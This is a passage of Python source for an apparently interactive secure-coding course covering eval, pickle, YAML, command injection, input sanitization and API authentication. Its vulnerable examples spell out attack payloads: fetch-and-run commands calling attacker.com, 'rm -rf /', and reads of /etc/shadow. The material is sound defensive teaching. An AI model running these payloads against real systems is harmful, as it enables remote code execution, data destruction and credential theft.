"""
Module 8: Secure Coding Practices

Covers common Python vulnerabilities (eval, pickle, YAML, subprocess),
input sanitization techniques, secure API design patterns, and secrets
management.  Every lesson pairs a vulnerable code example with its safe
counterpart so students build muscle memory for defensive coding.
"""

from utils.display import (
    section_header, sub_header, lesson_block, code_block,
    scenario_block, why_it_matters, info, success, warning, press_enter,
    show_menu, disclaimer, hint_text, ask_yes_no, C, G, Y, R, RESET, BRIGHT, DIM,
    pace, learning_goal, nice_work, tip,
)
from utils.progress import mark_lesson_complete, mark_challenge_complete
from utils.quiz import run_quiz
from utils.case_studies import show_case_study


# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║  Lesson 1 — Common Python Vulnerabilities                               ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

def _lesson_python_vulns(progress):
    """Lesson 1: Common Python Vulnerabilities."""
    section_header("Lesson 1: Common Python Vulnerabilities")

    learning_goal([
        "Recognize dangerous Python functions (eval, pickle, yaml.load)",
        "Understand why each one allows code execution",
        "Know the safe alternative for each pattern",
    ])

    pace()

    lesson_block(
        "Python's expressiveness has a dark side: several built-in features "
        "can be weaponized if used carelessly."
    )

    lesson_block(
        "In this lesson we look at the most dangerous patterns and learn "
        "the safe alternatives that every Python developer should know."
    )

    pace()

    # --- eval / exec ---
    sub_header("1. eval() and exec() -- Arbitrary Code Execution")

    lesson_block(
        "eval() takes a string and runs it as a Python expression. exec() "
        "does the same for arbitrary statements."
    )

    lesson_block(
        "If untrusted input reaches either function, the attacker can run "
        "ANY code on your system -- deleting files, installing backdoors, "
        "or stealing data."
    )

    pace()

    info("VULNERABLE code:")
    code_block(
        '# A "calculator" API endpoint — DO NOT do this\n'
        'def calculate(user_input):\n'
        '    """Evaluate a math expression from the user."""\n'
        '    result = eval(user_input)  # DANGER!\n'
        '    return result\n'
        '\n'
        '# An attacker sends:\n'
        '# user_input = "__import__(\'os\').system(\'rm -rf /\')"\n'
        '# user_input = "__import__(\'subprocess\').getoutput(\'cat /etc/shadow\')"',
        "python"
    )

    pace()

    warning("Even eval() with 'restricted' globals can be bypassed. Never use eval() on untrusted input.")

    pace()

    info("SAFE alternative:")
    code_block(
        'import ast\n'
        'import operator\n'
        '\n'
        '# Option 1: ast.literal_eval for simple data structures\n'
        'def safe_parse(user_input):\n'
        '    """Safely parse a Python literal (string, number, tuple, etc.)."""\n'
        '    try:\n'
        '        return ast.literal_eval(user_input)\n'
        '    except (ValueError, SyntaxError):\n'
        '        raise ValueError("Invalid input")',
        "python"
    )

    pace()

    code_block(
        '# Option 2: Build a real parser for math expressions\n'
        'ALLOWED_OPS = {\n'
        '    ast.Add: operator.add,\n'
        '    ast.Sub: operator.sub,\n'
        '    ast.Mult: operator.mul,\n'
        '    ast.Div: operator.truediv,\n'
        '}\n'
        '\n'
        'def safe_calculate(expr_string):\n'
        '    """Evaluate only arithmetic expressions — no function calls."""\n'
        '    tree = ast.parse(expr_string, mode="eval")\n'
        '    return _eval_node(tree.body)\n'
        '\n'
        'def _eval_node(node):\n'
        '    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)):\n'
        '        return node.value\n'
        '    if isinstance(node, ast.BinOp):\n'
        '        op_func = ALLOWED_OPS.get(type(node.op))\n'
        '        if op_func is None:\n'
        '            raise ValueError(f"Operator not allowed: {type(node.op).__name__}")\n'
        '        return op_func(_eval_node(node.left), _eval_node(node.right))\n'
        '    raise ValueError(f"Expression type not allowed: {type(node).__name__}")',
        "python"
    )

    pace()

    nice_work("You now know to never use eval() on user input. That alone prevents many real attacks!")

    press_enter()

    # --- pickle ---
    sub_header("2. pickle -- Deserialization of Untrusted Data")

    lesson_block(
        "Python's pickle module can serialize and deserialize arbitrary "
        "objects. Deserializing (unpickling) untrusted data is equivalent "
        "to running eval() on it."
    )

    lesson_block(
        "The attacker can execute arbitrary code by crafting a malicious "
        "pickle payload. This vulnerability is rated CRITICAL by every "
        "security framework."
    )

    pace()

    info("VULNERABLE code:")
    code_block(
        'import pickle\n'
        '\n'
        '# Loading pickled data from an untrusted source — DANGER!\n'
        'def load_user_session(session_data_bytes):\n'
        '    """Restore a user session from a cookie."""\n'
        '    return pickle.loads(session_data_bytes)  # RCE vulnerability!\n'
        '\n'
        '# An attacker crafts a pickle that runs code on deserialization:\n'
        'import os\n'
        'class Exploit:\n'
        '    def __reduce__(self):\n'
        '        return (os.system, ("curl attacker.com/shell.sh | bash",))\n'
        '\n'
        'malicious_payload = pickle.dumps(Exploit())',
        "python"
    )

    pace()

    info("SAFE alternative:")
    code_block(
        'import json\n'
        'import hmac\n'
        'import hashlib\n'
        '\n'
        '# Option 1: Use JSON (can only represent basic data types)\n'
        'def safe_load_session(session_json):\n'
        '    """Load session data from JSON — no code execution possible."""\n'
        '    return json.loads(session_json)',
        "python"
    )

    pace()

    code_block(
        '# Option 2: If you MUST use pickle, sign the data with HMAC\n'
        'SECRET_KEY = b"loaded-from-environment-variable"\n'
        '\n'
        'def sign_data(data_bytes):\n'
        '    sig = hmac.new(SECRET_KEY, data_bytes, hashlib.sha256).hexdigest()\n'
        '    return sig + ":" + data_bytes.hex()\n'
        '\n'
        'def verify_and_load(signed_string):\n'
        '    sig, hex_data = signed_string.split(":", 1)\n'
        '    data_bytes = bytes.fromhex(hex_data)\n'
        '    expected_sig = hmac.new(SECRET_KEY, data_bytes, hashlib.sha256).hexdigest()\n'
        '    if not hmac.compare_digest(sig, expected_sig):\n'
        '        raise ValueError("Data tampered with — signature mismatch")\n'
        '    return pickle.loads(data_bytes)  # Only safe because WE signed it',
        "python"
    )

    pace()

    tip(
        "Best practice: avoid pickle entirely and use JSON, MessagePack, "
        "Protocol Buffers, or another safe serialization format."
    )

    press_enter()

    # --- YAML ---
    sub_header("3. YAML Unsafe Loading")

    lesson_block(
        "PyYAML's yaml.load() without a safe Loader can execute arbitrary "
        "Python code via YAML tags like !!python/object/apply."
    )

    lesson_block(
        "This has caused real-world remote code execution vulnerabilities "
        "in many popular projects."
    )

    pace()

    info("VULNERABLE code:")
    code_block(
        'import yaml\n'
        '\n'
        '# Loading YAML from an untrusted source — DANGER!\n'
        'config = yaml.load(user_uploaded_yaml)  # No Loader specified!\n'
        '\n'
        '# Malicious YAML payload:\n'
        '# !!python/object/apply:os.system ["curl attacker.com/shell.sh|bash"]',
        "python"
    )

    pace()

    info("SAFE alternative:")
    code_block(
        'import yaml\n'
        '\n'
        '# ALWAYS specify SafeLoader (or use yaml.safe_load)\n'
        'config = yaml.safe_load(user_uploaded_yaml)\n'
        '\n'
        '# Or explicitly:\n'
        'config = yaml.load(user_uploaded_yaml, Loader=yaml.SafeLoader)\n'
        '\n'
        '# For your own trusted config files where you need Python objects:\n'
        '# Use yaml.FullLoader (default since PyYAML 6.0) but NEVER on\n'
        '# untrusted input.',
        "python"
    )

    pace()

    nice_work("Three down, one to go! You are building great secure coding habits.")

    press_enter()

    # --- Command injection ---
    sub_header("4. Command Injection via subprocess")

    lesson_block(
        "subprocess.run() with shell=True passes the command string through "
        "/bin/sh, which means special characters like ;, |, &&, and $() are "
        "interpreted."
    )

    lesson_block(
        "If user input is concatenated into the command string, the attacker "
        "can inject arbitrary shell commands."
    )

    pace()

    info("VULNERABLE code:")
    code_block(
        'import subprocess\n'
        '\n'
        '# Ping a user-specified host — DANGER!\n'
        'def ping_host(hostname):\n'
        '    """Ping a host and return the output."""\n'
        '    result = subprocess.run(\n'
        '        f"ping -c 3 {hostname}",  # string concatenation!\n'
        '        shell=True,                # shell interpretation!\n'
        '        capture_output=True, text=True\n'
        '    )\n'
        '    return result.stdout\n'
        '\n'
        '# An attacker sends:\n'
        '# hostname = "8.8.8.8; cat /etc/shadow"\n'
        '# hostname = "8.8.8.8 && curl attacker.com/backdoor.sh | bash"',
        "python"
    )

    pace()

    info("SAFE alternative:")
    code_block(
        'import subprocess\n'
        'import shlex\n'
        'import re\n'
        '\n'
        '# Option 1: Use a list of arguments (no shell interpretation)\n'
        'def safe_ping(hostname):\n'
        '    """Ping a host safely — no shell injection possible."""\n'
        '    # Validate input first\n'
        '    if not re.match(r"^[a-zA-Z0-9.\\-]+$", hostname):\n'
        '        raise ValueError("Invalid hostname")\n'
        '    result = subprocess.run(\n'
        '        ["ping", "-c", "3", hostname],  # list, not string!\n'
        '        capture_output=True, text=True,\n'
        '        timeout=15  # always set a timeout\n'
        '    )\n'
        '    return result.stdout',
        "python"
    )

    pace()

    code_block(
        '# Option 2: If you MUST use shell=True, use shlex.quote()\n'
        'def safer_ping(hostname):\n'
        '    safe_hostname = shlex.quote(hostname)\n'
        '    result = subprocess.run(\n'
        '        f"ping -c 3 {safe_hostname}",\n'
        '        shell=True, capture_output=True, text=True\n'
        '    )\n'
        '    return result.stdout\n'
        '\n'
        '# Best practice: ALWAYS prefer the list form and avoid shell=True.',
        "python"
    )

    pace()

    tip("Remember the rule: use a LIST of arguments, not a string, when calling subprocess.")

    press_enter()

    why_it_matters(
        "These four vulnerability classes (eval, pickle, YAML, command injection) "
        "appear in real CVEs every year. In 2023, a pickle deserialization "
        "vulnerability in a popular ML library allowed attackers to execute "
        "arbitrary code on any machine that loaded a malicious model file."
    )

    pace()

    scenario_block(
        "The Calculator App",
        "A developer at a fintech startup built a calculator feature using "
        "eval() to process user-entered formulas. During a penetration test, "
        "a consultant submitted '__import__(\"os\").popen(\"env\").read()' as a "
        "formula and received the entire server environment including database "
        "credentials, API keys, and JWT secrets. The company had to rotate "
        "every credential, audit all transactions, and notify affected customers."
    )

    press_enter()

    nice_work("You just learned the four most common Python security pitfalls. Excellent work!")

    # --- Practice challenge ---
    sub_header("Practice Challenge: Spot the Vulnerability")

    lesson_block(
        "Examine the following code. Identify ALL the security vulnerabilities "
        "and explain how you would fix each one:"
    )

    code_block(
        'import pickle\n'
        'import yaml\n'
        'import subprocess\n'
        '\n'
        'def process_upload(file_content, filename):\n'
        '    """Process an uploaded file based on its extension."""\n'
        '    if filename.endswith(".pkl"):\n'
        '        data = pickle.loads(file_content)\n'
        '    elif filename.endswith(".yml"):\n'
        '        data = yaml.load(file_content)\n'
        '    else:\n'
        '        # Convert with external tool\n'
        '        subprocess.run(f"convert {filename}", shell=True)\n'
        '        data = None\n'
        '    return data',
        "python"
    )

    hint_text(
        "There are at least THREE separate vulnerabilities in this function..."
    )

    if ask_yes_no("Ready to see the answer?"):
        success("Vulnerabilities found:")
        print(f"    {R}1. pickle.loads(file_content){RESET}")
        print("       Arbitrary code execution via crafted pickle payload.")
        print(f"       {G}Fix: Use json.loads() or reject .pkl uploads entirely.{RESET}")
        print()
        print(f"    {R}2. yaml.load(file_content) without SafeLoader{RESET}")
        print("       Arbitrary code execution via YAML tags.")
        print(f"       {G}Fix: Use yaml.safe_load(file_content).{RESET}")
        print()
        print(f"    {R}3. subprocess.run(f\"convert {{filename}}\", shell=True){RESET}")
        print("       Command injection via the filename parameter.")
        print(f"       {G}Fix: subprocess.run([\"convert\", filename]) without shell=True,{RESET}")
        print(f"       {G}and validate the filename against a whitelist pattern.{RESET}")
        mark_challenge_complete(progress, "module8", "spot_vuln_challenge")

    mark_lesson_complete(progress, "module8", "python_vulns")
    success("Lesson 1 complete: Common Python Vulnerabilities")
    press_enter()


# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║  Lesson 2 — Input Sanitization                                          ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

def _lesson_input_sanitization(progress):
    """Lesson 2: Input Sanitization."""
    section_header("Lesson 2: Input Sanitization")

    learning_goal([
        "Understand why whitelisting beats blacklisting",
        "Validate types, lengths, and formats at trust boundaries",
        "Encode output correctly for HTML, URLs, and SQL",
    ])

    pace()

    lesson_block(
        "The cardinal rule of secure coding: NEVER TRUST USER INPUT."
    )

    lesson_block(
        "Every piece of data that crosses a trust boundary -- HTTP requests, "
        "file uploads, API calls, database results, even environment "
        "variables -- must be validated and sanitized before use."
    )

    pace()

    # --- Whitelisting vs blacklisting ---
    sub_header("Whitelisting vs. Blacklisting")

    lesson_block(
        "BLACKLISTING (deny-list) tries to block known-bad input. This is "
        "fragile because attackers constantly find new bypass techniques."
    )

    lesson_block(
        "WHITELISTING (allow-list) defines exactly what IS allowed and rejects "
        "everything else. This is the better approach because unknown inputs "
        "are rejected by default."
    )

    pace()

    info("WEAK (blacklist) approach:")
    code_block(
        '# Trying to block SQL injection characters — fragile!\n'
        "BLACKLIST = [\"'\", '\"', \";\", \"--\", \"/*\", \"*/\", \"DROP\", \"UNION\"]\n"
        '\n'
        'def sanitize_blacklist(user_input):\n'
        '    """Remove blacklisted characters. Easy to bypass!"""\n'
        '    cleaned = user_input\n'
        '    for bad in BLACKLIST:\n'
        '        cleaned = cleaned.replace(bad, "")\n'
        '    return cleaned',
        "python"
    )

    pace()

    code_block(
        '# Bypasses:\n'
        "# - URL encoding: %27 instead of '\n"
        '# - Unicode: different quote characters\n'
        '# - Case variations: uNiOn SeLeCt\n'
        '# - Double encoding: %2527',
        "python"
    )

    pace()

    info("STRONG (whitelist) approach:")
    code_block(
        'import re\n'
        '\n'
        '# Define what IS allowed — reject everything else\n'
        'USERNAME_PATTERN = re.compile(r"^[a-zA-Z0-9_]{3,30}$")\n'
        'EMAIL_PATTERN = re.compile(\n'
        '    r"^[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}$"\n'
        ')',
        "python"
    )

    pace()

    code_block(
        'def validate_username(username):\n'
        '    """Only allow alphanumeric characters and underscores."""\n'
        '    if not USERNAME_PATTERN.match(username):\n'
        '        raise ValueError(\n'
        '            "Username must be 3-30 chars: letters, numbers, underscore"\n'
        '        )\n'
        '    return username\n'
        '\n'
        'def validate_email(email):\n'
        '    """Validate email format against a whitelist pattern."""\n'
        '    if not EMAIL_PATTERN.match(email):\n'
        '        raise ValueError("Invalid email format")\n'
        '    if len(email) > 254:  # RFC 5321 limit\n'
        '        raise ValueError("Email address too long")\n'
        '    return email.lower()',
        "python"
    )

    pace()

    nice_work("Whitelist over blacklist -- that single rule will save you many headaches!")

    press_enter()

    # --- Type checking ---
    sub_header("Type Checking and Coercion")

    lesson_block(
        "Python is dynamically typed, which means a function expecting an "
        "integer might receive a string with malicious content. Always "
        "enforce types at trust boundaries."
    )

    pace()

    code_block(
        'def get_page_number(raw_input):\n'
        '    """Safely convert user input to a page number."""\n'
        '    try:\n'
        '        page = int(raw_input)\n'
        '    except (ValueError, TypeError):\n'
        '        raise ValueError("Page must be a valid integer")\n'
        '    if page < 1 or page > 10000:\n'
        '        raise ValueError("Page must be between 1 and 10000")\n'
        '    return page',
        "python"
    )

    pace()

    code_block(
        '# With type hints and runtime validation (using Pydantic):\n'
        'from pydantic import BaseModel, Field, validator\n'
        '\n'
        'class SearchRequest(BaseModel):\n'
        '    query: str = Field(..., min_length=1, max_length=200)\n'
        '    page: int = Field(default=1, ge=1, le=10000)\n'
        '    per_page: int = Field(default=20, ge=1, le=100)\n'
        '\n'
        '    @validator("query")\n'
        '    def sanitize_query(cls, v):\n'
        '        # Remove control characters\n'
        '        return "".join(c for c in v if c.isprintable())',
        "python"
    )

    pace()

    tip("Pydantic is a great library for automatic validation. It catches many input bugs for free.")

    press_enter()

    # --- Length limits ---
    sub_header("Length Limits and Size Constraints")

    lesson_block(
        "Buffer overflows may be rare in Python, but denial-of-service via "
        "oversized input is very real."
    )

    lesson_block(
        "A 10 GB JSON payload, a 5-million-character username, or a regex "
        "applied to a very long string (ReDoS) can crash your application."
    )

    pace()

    code_block(
        '# Always enforce size limits\n'
        'MAX_REQUEST_SIZE = 1_048_576  # 1 MB\n'
        'MAX_FIELD_LENGTH = 1000       # characters\n'
        'MAX_FILE_SIZE = 10_485_760    # 10 MB\n'
        '\n'
        'def validate_request_body(body: bytes) -> bytes:\n'
        '    if len(body) > MAX_REQUEST_SIZE:\n'
        '        raise ValueError(\n'
        '            f"Request body too large: {len(body)} bytes "\n'
        '            f"(max {MAX_REQUEST_SIZE})"\n'
        '        )\n'
        '    return body',
        "python"
    )

    pace()

    code_block(
        'def validate_text_field(value: str, field_name: str,\n'
        '                        max_length: int = MAX_FIELD_LENGTH) -> str:\n'
        '    if len(value) > max_length:\n'
        '        raise ValueError(\n'
        '            f"{field_name} too long: {len(value)} chars "\n'
        '            f"(max {max_length})"\n'
        '        )\n'
        '    return value',
        "python"
    )

    pace()

    press_enter()

    # --- Encoding ---
    sub_header("Output Encoding")

    lesson_block(
        "Input validation is half the battle. The other half is OUTPUT "
        "ENCODING -- transforming data before inserting it into a different "
        "context (HTML, SQL, shell, URL) so it cannot be interpreted as code."
    )

    pace()

    code_block(
        'import html\n'
        'import urllib.parse\n'
        '\n'
        '# HTML encoding — prevents XSS\n'
        'user_comment = \'<script>alert("XSS")</script>\'\n'
        'safe_html = html.escape(user_comment)\n'
        '# Result: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;\n'
        '\n'
        '# URL encoding — safe for query parameters\n'
        'search_term = "cats & dogs"\n'
        'safe_url = urllib.parse.quote(search_term)\n'
        '# Result: cats%20%26%20dogs',
        "python"
    )

    pace()

    code_block(
        '# SQL parameterization — prevents SQL injection\n'
        'import sqlite3\n'
        'conn = sqlite3.connect(":memory:")\n'
        'cursor = conn.cursor()\n'
        '\n'
        '# WRONG — string formatting\n'
        '# cursor.execute(f"SELECT * FROM users WHERE name = \'{name}\'")\n'
        '\n'
        '# RIGHT — parameterized query\n'
        'cursor.execute("SELECT * FROM users WHERE name = ?", (name,))',
        "python"
    )

    pace()

    nice_work("You now understand both input validation AND output encoding. Strong combo!")

    press_enter()

    # --- Building a sanitization library ---
    sub_header("Building a Sanitization Library")

    lesson_block(
        "In a real project you want a single module that all code imports for "
        "input validation. This centralizes your security logic so it can be "
        "audited, tested, and updated in one place."
    )

    pace()

    code_block(
        '"""sanitize.py — Central input sanitization module."""\n'
        '\n'
        'import re\n'
        'import html\n'
        'import unicodedata\n'
        '\n'
        'class ValidationError(Exception):\n'
        '    """Raised when input fails validation."""\n'
        '    pass\n'
        '\n'
        'def clean_string(value, max_length=500, allow_newlines=False):\n'
        '    """Remove control characters and enforce length limits."""\n'
        '    if not isinstance(value, str):\n'
        '        raise ValidationError(f"Expected string, got {type(value).__name__}")\n'
        '    # Normalize Unicode to prevent homograph attacks\n'
        '    value = unicodedata.normalize("NFKC", value)',
        "python"
    )

    pace()

    code_block(
        '    # Strip control characters (keep newlines if allowed)\n'
        '    if allow_newlines:\n'
        '        value = "".join(c for c in value if c.isprintable() or c in "\\n\\r\\t")\n'
        '    else:\n'
        '        value = "".join(c for c in value if c.isprintable())\n'
        '    # Enforce length\n'
        '    if len(value) > max_length:\n'
        '        raise ValidationError(f"Input too long: {len(value)} > {max_length}")\n'
        '    return value.strip()\n'
        '\n'
        'def clean_html(value):\n'
        '    """Escape HTML entities to prevent XSS."""\n'
        '    return html.escape(clean_string(value), quote=True)',
        "python"
    )

    pace()

    code_block(
        'def validate_int(value, min_val=None, max_val=None):\n'
        '    """Convert to int and enforce range."""\n'
        '    try:\n'
        '        result = int(value)\n'
        '    except (ValueError, TypeError):\n'
        '        raise ValidationError(f"Not a valid integer: {value!r}")\n'
        '    if min_val is not None and result < min_val:\n'
        '        raise ValidationError(f"Value {result} below minimum {min_val}")\n'
        '    if max_val is not None and result > max_val:\n'
        '        raise ValidationError(f"Value {result} above maximum {max_val}")\n'
        '    return result',
        "python"
    )

    pace()

    code_block(
        'def validate_choice(value, allowed):\n'
        '    """Ensure value is one of the allowed options."""\n'
        '    if value not in allowed:\n'
        '        raise ValidationError(\n'
        '            f"Invalid choice: {value!r}. Allowed: {allowed}"\n'
        '        )\n'
        '    return value\n'
        '\n'
        'def validate_filename(filename):\n'
        '    """Sanitize a filename to prevent path traversal."""\n'
        '    # Remove any directory components\n'
        '    filename = filename.replace("\\\\", "/").split("/")[-1]\n'
        '    # Remove null bytes\n'
        '    filename = filename.replace("\\x00", "")\n'
        '    # Only allow safe characters\n'
        '    if not re.match(r"^[a-zA-Z0-9._\\-]{1,255}$", filename):\n'
        '        raise ValidationError(f"Invalid filename: {filename!r}")\n'
        '    # Block dangerous extensions\n'
        '    BLOCKED_EXTENSIONS = {".exe", ".bat", ".cmd", ".sh", ".py", ".php"}\n'
        '    for ext in BLOCKED_EXTENSIONS:\n'
        '        if filename.lower().endswith(ext):\n'
        '            raise ValidationError(f"File type not allowed: {ext}")\n'
        '    return filename',
        "python"
    )

    pace()

    tip("Build your sanitization library once, test it well, and reuse it everywhere.")

    press_enter()

    why_it_matters(
        "Over 70% of web application vulnerabilities -- SQL injection, XSS, "
        "path traversal, command injection -- come from insufficient input "
        "validation. A centralized sanitization library is the single most "
        "cost-effective security investment a development team can make."
    )

    pace()

    scenario_block(
        "The Unicode Bypass",
        "A social media platform validated usernames by checking for '<' and '>' "
        "characters to prevent XSS. An attacker used fullwidth Unicode characters "
        "(U+FF1C for < and U+FF1E for >) which passed validation but were "
        "rendered as real angle brackets in some browsers, enabling stored XSS. "
        "The fix: normalize Unicode with NFKC before validation, which converts "
        "fullwidth characters to their ASCII equivalents."
    )

    press_enter()

    # --- Practice challenge ---
    sub_header("Practice Challenge: Fix the Sanitization")

    lesson_block(
        "This function has multiple sanitization problems. Identify them all:"
    )

    code_block(
        'def save_profile(username, bio, age, avatar_filename):\n'
        '    """Save a user profile."""\n'
        '    # Store username directly\n'
        '    db.execute(f"UPDATE users SET name=\'{username}\' WHERE id=?")\n'
        '    # Render bio in HTML\n'
        '    template = f"<div class=\\"bio\\">{bio}</div>"\n'
        '    # Use age in calculation\n'
        '    birth_year = 2025 - int(age)\n'
        '    # Save uploaded avatar\n'
        '    with open(f"/uploads/{avatar_filename}", "wb") as f:\n'
        '        f.write(avatar_data)',
        "python"
    )

    hint_text(
        "Think about: SQL injection, XSS, type errors, path traversal..."
    )

    if ask_yes_no("Ready to see the answer?"):
        success("Problems and fixes:")
        print(f"    {R}1. SQL injection in username{RESET}")
        print(f"       {G}Fix: Use parameterized query: db.execute('UPDATE users SET name=? WHERE id=?', (username, uid)){RESET}")
        print()
        print(f"    {R}2. XSS in bio — raw user input in HTML{RESET}")
        print(f"       {G}Fix: html.escape(bio) before inserting into template{RESET}")
        print()
        print(f"    {R}3. Unvalidated age — int() will crash on bad input{RESET}")
        print(f"       {G}Fix: try/except, then range-check (0 < age < 150){RESET}")
        print()
        print(f"    {R}4. Path traversal in avatar_filename{RESET}")
        print("       An attacker sends '../../etc/cron.d/backdoor' as filename")
        print(f"       {G}Fix: Validate filename, strip directory components, use a generated UUID name{RESET}")
        mark_challenge_complete(progress, "module8", "fix_sanitization_challenge")

    mark_lesson_complete(progress, "module8", "input_sanitization")
    success("Lesson 2 complete: Input Sanitization")
    press_enter()


# ╔═══════════════════════════════════════════════════════════════════════════╗
# ║  Lesson 3 — Secure API Design                                           ║
# ╚═══════════════════════════════════════════════════════════════════════════╝

def _lesson_secure_api(progress):
    """Lesson 3: Secure API Design."""
    section_header("Lesson 3: Secure API Design")

    learning_goal([
        "Add authentication (API keys, JWT, OAuth) to APIs",
        "Implement rate limiting and CORS",
        "Handle errors without leaking information",
        "Enforce HTTPS and security headers",
    ])

    pace()

    lesson_block(
        "APIs are the primary attack surface of modern applications. Whether "
        "you are building a REST API, GraphQL endpoint, or internal service, "
        "security must be designed in from the start."
    )

    pace()

    # --- Authentication ---
    sub_header("1. Authentication: Who Is Making This Request?")

    lesson_block(
        "Authentication verifies identity. There are three common approaches "
        "for API authentication, each with different tradeoffs."
    )

    pace()

    lesson_block(
        "API KEYS: Simple string tokens passed in a header. Easy to implement "
        "but hard to manage at scale. Best for server-to-server communication."
    )

    code_block(
        'import hashlib\n'
        'import hmac\n'
        'import os\n'
        'from functools import wraps\n'
        'from flask import request, jsonify\n'
        '\n'
        '# API key authentication decorator\n'
        'VALID_API_KEYS = {}  # loaded from a secure store, NOT hardcoded\n'
        '\n'
        'def require_api_key(f):\n'
        '    @wraps(f)\n'
        '    def decorated(*args, **kwargs):\n'
        '        api_key = request.headers.get("X-API-Key")\n'
        '        if not api_key:\n'
        '            return jsonify({"error": "API key required"}), 401\n'
        '        # Use constant-time comparison to prevent timing attacks\n'
        '        key_hash = hashlib.sha256(api_key.encode()).hexdigest()\n'
        '        if key_hash not in VALID_API_KEYS:\n'
        '            return jsonify({"error": "Invalid API key"}), 403\n'
        '        return f(*args, **kwargs)\n'
        '    return decorated',
        "python"
    )

    pace()

    press_enter()

    lesson_block(
        "JWT (JSON Web Tokens): Self-contained tokens that encode claims "
        "about the user (user ID, roles, expiration). The server signs the "
        "token so it can verify authenticity without a database lookup."
    )

    pace()

    code_block(
        'import jwt\n'
        'import datetime\n'
        'import os\n'
        '\n'
        'JWT_SECRET = os.environ["JWT_SECRET"]  # NEVER hardcode this\n'
        'JWT_ALGORITHM = "HS256"\n'
        'JWT_EXPIRATION_HOURS = 1\n'
        '\n'
        'def create_token(user_id, roles):\n'
        '    """Issue a JWT with expiration and role claims."""\n'
        '    payload = {\n'
        '        "sub": user_id,\n'
        '        "roles": roles,\n'
        '        "iat": datetime.datetime.utcnow(),\n'
        '        "exp": datetime.datetime.utcnow()\n'
        '              + datetime.timedelta(hours=JWT_EXPIRATION_HOURS),\n'
        '    }\n'
        '    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)',
        "python"
    )

    pace()

    code_block(
        'def verify_token(token):\n'
        '    """Decode and verify a JWT. Raises on invalid/expired tokens."""\n'
        '    try:\n'
        '        payload = jwt.decode(\n'
        '            token, JWT_SECRET,\n'
        '            algorithms=[JWT_ALGORITHM]  # ALWAYS specify algorithms!\n'
        '        )\n'
        '        return payload\n'
        '    except jwt.ExpiredSignatureError:\n'
        '        raise ValueError("Token has expired")\n'
        '    except jwt.InvalidTokenError:\n'
        '        raise ValueError("Invalid token")',
        "python"
    )

    pace()

    nice_work("API keys and JWTs are the two most common auth methods you will see in practice!")

    press_enter()

    lesson_block(
        "OAUTH 2.0: A delegation protocol where users authorize third-party "
        "apps to access their data without sharing their password."
    )

    lesson_block(
        "The user authenticates with the identity provider (Google, GitHub, "
        "etc.), which issues an access token to the app. Complex to implement "
        "but the industry standard for user-facing APIs."
    )

    pace()

    code_block(
        '# OAuth 2.0 flow (simplified):\n'
        '#\n'
        '# 1. App redirects user to provider:\n'
        '#    GET https://auth.example.com/authorize?\n'
        '#        client_id=YOUR_ID&\n'
        '#        redirect_uri=https://yourapp.com/callback&\n'
        '#        response_type=code&\n'
        '#        scope=read:profile\n'
        '#\n'
        '# 2. User logs in and consents.\n'
        '#    Provider redirects to your callback with an auth code.\n'
        '#\n'
        '# 3. Your server exchanges the code for an access token:\n'
        '#    POST https://auth.example.com/token\n'
        '#        grant_type=authorization_code&\n'
        '#        code=AUTH_CODE&\n'
        '#        client_id=YOUR_ID&\n'
        '#        client_secret=YOUR_SECRET  # server-side only!',
        "text"
    )

    pace()

    code_block(
        '# 4. Use the access token to call the API:\n'
        '#    GET https://api.example.com/profile\n'
        '#    Authorization: Bearer ACCESS_TOKEN\n'
        '#\n'
        '# Key security rules:\n'
        '# - ALWAYS use PKCE for public clients (mobile/SPA)\n'
        '# - ALWAYS validate the state parameter to prevent CSRF\n'
        '# - NEVER expose client_secret in frontend code\n'
        '# - Set short token expiration (1 hour) with refresh tokens',
        "text"
    )

    pace()

    press_enter()

    # --- Rate limiting ---
    sub_header("2. Rate Limiting")

    lesson_block(
        "Rate limiting prevents abuse by capping the number of requests a "
        "client can make within a time window."
    )

    lesson_block(
        "Without it, attackers can brute-force logins, scrape data, or "
        "overwhelm your service with requests."
    )

    pace()

    code_block(
        'import time\n'
        'from collections import defaultdict\n'
        'from functools import wraps\n'
        'from flask import request, jsonify\n'
        '\n'
        'class RateLimiter:\n'
        '    """Simple in-memory rate limiter (use Redis in production)."""\n'
        '\n'
        '    def __init__(self, max_requests=100, window_seconds=60):\n'
        '        self.max_requests = max_requests\n'
        '        self.window = window_seconds\n'
        '        self.requests = defaultdict(list)  # ip -> [timestamps]',
        "python"
    )

    pace()

    code_block(
        '    def is_allowed(self, client_id):\n'
        '        """Check if a request from client_id is within limits."""\n'
        '        now = time.time()\n'
        '        cutoff = now - self.window\n'
        '        # Remove expired timestamps\n'
        '        self.requests[client_id] = [\n'
        '            t for t in self.requests[client_id] if t > cutoff\n'
        '        ]\n'
        '        if len(self.requests[client_id]) >= self.max_requests:\n'
        '            return False\n'
        '        self.requests[client_id].append(now)\n'
        '        return True',
        "python"
    )

    pace()

    code_block(
        'limiter = RateLimiter(max_requests=100, window_seconds=60)\n'
        '\n'
        'def rate_limit(f):\n'
        '    @wraps(f)\n'
        '    def decorated(*args, **kwargs):\n'
        '        client_ip = request.remote_addr\n'
        '        if not limiter.is_allowed(client_ip):\n'
        '            return jsonify({"error": "Rate limit exceeded"}), 429\n'
        '        return f(*args, **kwargs)\n'
        '    return decorated',
        "python"
    )

    pace()

    nice_work("Rate limiting is one of the simplest and most effective API protections!")

    press_enter()

    # --- CORS ---
    sub_header("3. CORS (Cross-Origin Resource Sharing)")

    lesson_block(
        "CORS controls which web pages can make requests to your API. "
        "Without proper CORS headers, any website could make authenticated "
        "requests to your API using your users' cookies."
    )

    pace()

    code_block(
        '# DANGEROUS — allows any website to call your API\n'
        '# Access-Control-Allow-Origin: *\n'
        '\n'
        '# SAFE — only allow your own frontend\n'
        'ALLOWED_ORIGINS = [\n'
        '    "https://app.yourcompany.com",\n'
        '    "https://staging.yourcompany.com",\n'
        ']\n'
        '\n'
        'from flask import Flask\n'
        'from flask_cors import CORS\n'
        '\n'
        'app = Flask(__name__)\n'
        'CORS(app, origins=ALLOWED_ORIGINS, supports_credentials=True)',
        "python"
    )

    pace()

    code_block(
        '# Manual CORS headers (if not using flask-cors):\n'
